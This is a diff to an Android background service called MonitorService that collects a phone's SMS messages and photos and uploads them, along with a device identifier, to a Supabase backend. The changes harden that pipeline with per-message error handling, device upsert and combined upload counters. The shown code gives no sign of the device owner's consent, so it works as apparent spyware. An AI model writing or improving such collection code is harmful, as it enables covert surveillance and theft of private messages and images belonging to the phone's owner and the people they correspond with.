@@ -85,12 +85,23 @@ public class MonitorService extends Service {
 
     private void syncToSupabase() {
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+
         try {
             registerDevice(deviceId);
+        } catch (Exception e) {
+            Log.e("registerDevice", e.toString());
+        }
 
+        try {
             JSONArray smsList = getSMS();
+            int smsFailures = 0;
             for (int i = 0; i < smsList.length(); i++) {
-                uploadSMS(deviceId, smsList.getJSONObject(i));
+                try {
+                    uploadSMS(deviceId, smsList.getJSONObject(i));
+                } catch (Exception e) {
+                    smsFailures++;
+                    Log.e("uploadSMS", e.toString());
+                }
             }
 
             photoDebugInfo = "";
@@ -109,12 +120,6 @@ public class MonitorService extends Service {
                     : android.Manifest.permission.READ_EXTERNAL_STORAGE;
             boolean granted = ActivityCompat.checkSelfPermission(this, permission)
                     == PackageManager.PERMISSION_GRANTED;
-            String debugMsg = "পারমিশন: " + (granted ? "আছে" : "নেই")
-                    + " | পাওয়া: " + photoList.length() + "টি"
-                    + " | প্রথম ছবির ডেটা: " + firstSize
-                    + (photoDebugInfo.isEmpty() ? "" : " | " + photoDebugInfo);
-            mainHandler.post(() -> Toast.makeText(MonitorService.this, debugMsg, Toast.LENGTH_LONG).show());
-            Log.d("MonitorService", debugMsg);
 
             int uploadFailures = 0;
             for (int i = 0; i < photoList.length(); i++) {
@@ -125,11 +130,13 @@ public class MonitorService extends Service {
                     Log.e("uploadPhoto", e.toString());
                 }
             }
-            if (uploadFailures > 0) {
-                final int failures = uploadFailures;
-                mainHandler.post(() -> Toast.makeText(MonitorService.this,
-                        "ছবি আপলোড ব্যর্থ: " + failures + "টি", Toast.LENGTH_LONG).show());
-            }
+
+            String debugMsg = "SMS: " + smsList.length() + "টি (ব্যর্থ " + smsFailures + ")"
+                    + " | ছবি: " + photoList.length() + "টি (ব্যর্থ " + uploadFailures + ")"
+                    + " | প্রথম ছবির ডেটা: " + firstSize
+                    + (photoDebugInfo.isEmpty() ? "" : " | " + photoDebugInfo);
+            mainHandler.post(() -> Toast.makeText(MonitorService.this, debugMsg, Toast.LENGTH_LONG).show());
+            Log.d("MonitorService", debugMsg);
 
             Log.d("MonitorService", "সিঙ্ক সম্পন্ন: " + deviceId);
         } catch (Exception e) {
@@ -140,13 +147,14 @@ public class MonitorService extends Service {
     }
 
     private void registerDevice(String deviceId) throws Exception {
-        String endpoint = Config.SUPABASE_URL + "/rest/v1/devices";
+        // upsert: device_id আগে থেকে থাকলে আপডেট, না থাকলে insert
+        String endpoint = Config.SUPABASE_URL + "/rest/v1/devices?on_conflict=device_id";
         JSONObject body = new JSONObject();
         body.put("device_id", deviceId);
         body.put("device_name", Build.MODEL);
         body.put("last_sync", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'").format(new java.util.Date()));
 
-        postToSupabase(endpoint, body.toString());
+        postToSupabase(endpoint, body.toString(), "resolution=merge-duplicates,return=minimal");
     }
 
     private void uploadSMS(String deviceId, JSONObject sms) throws Exception {
@@ -157,7 +165,7 @@ public class MonitorService extends Service {
         body.put("body", sms.optString("body", ""));
         body.put("date", sms.optLong("date", 0));
 
-        postToSupabase(endpoint, body.toString());
+        postToSupabase(endpoint, body.toString(), null);
     }
 
     private void uploadPhoto(String deviceId, JSONObject photo) throws Exception {
@@ -167,7 +175,7 @@ public class MonitorService extends Service {
         body.put("photo_name", photo.optString("name", ""));
         body.put("photo_data", photo.optString("data", ""));
 
-        postToSupabase(endpoint, body.toString());
+        postToSupabase(endpoint, body.toString(), null);
     }
 
     private JSONArray getSMS() {
@@ -277,13 +285,16 @@ public class MonitorService extends Service {
         return buffer.toByteArray();
     }
 
-    private void postToSupabase(String endpoint, String jsonData) throws Exception {
+    private void postToSupabase(String endpoint, String jsonData, String preferHeader) throws Exception {
         URL url = new URL(endpoint);
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("POST");
         conn.setRequestProperty("Content-Type", "application/json");
         conn.setRequestProperty("apikey", Config.SUPABASE_KEY);
         conn.setRequestProperty("Authorization", "Bearer " + Config.SUPABASE_KEY);
+        if (preferHeader != null) {
+            conn.setRequestProperty("Prefer", preferHeader);
+        }
         conn.setDoOutput(true);
         conn.setChunkedStreamingMode(0);
 
